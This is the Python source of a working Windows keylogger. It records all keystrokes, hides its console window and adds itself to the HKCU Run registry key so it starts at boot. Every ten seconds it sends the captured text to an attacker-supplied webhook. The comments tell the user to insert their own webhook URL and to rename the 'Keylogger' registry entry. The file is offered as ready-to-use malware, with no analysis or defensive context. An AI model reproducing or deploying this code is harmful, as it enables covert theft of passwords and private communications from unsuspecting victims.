import requests
import threading
import os
import sys
import ctypes
import winreg
from pynput import keyboard
from dotenv import load_dotenv

# Note: os and dotenv not needed for this script. Only included to hide webhook URL. 
# Replace "os.getenv("WEBHOOK_URL")" with your webhook URL. 

# Timing can be adjusted by changing the number in the threading.Timer() function. This will change
# the polling delay.

load_dotenv() # Delete line for personal use.

log = ""
WEBHOOK_URL = os.getenv("WEBHOOK_URL") # Replace with your webhook URL.

def report():
    global log
    if log:
        requests.post(WEBHOOK_URL, json={"content": log})
        log = ""
    
    timer = threading.Timer(10, report)
    timer.start()

def on_press(key):
    global log
    try:     
        log = log + key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log = log + " "
        elif key == keyboard.Key.enter:
            log = log + "\n"
        else:
            log = log + ('[' + str(key) + ']')
    if key == keyboard.Key.esc:
        return False

def hide_console():
    handle = ctypes.windll.kernel32.GetConsoleWindow()
    if handle:
        ctypes.windll.user32.ShowWindow(handle, 0)
    
# Get path to exetuable, open registry key, and add to run.
# Note: Can change name from "Keylogger" to anything you want.
def add_to_startup(): # Run at startup HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    if getattr(sys, 'frozen', False):
        path = sys.executable
    else:
        path = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Keylogger", 0, winreg.REG_SZ, path)
    winreg.CloseKey(key)

if __name__ == "__main__":
    hide_console()
    add_to_startup()
    report()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()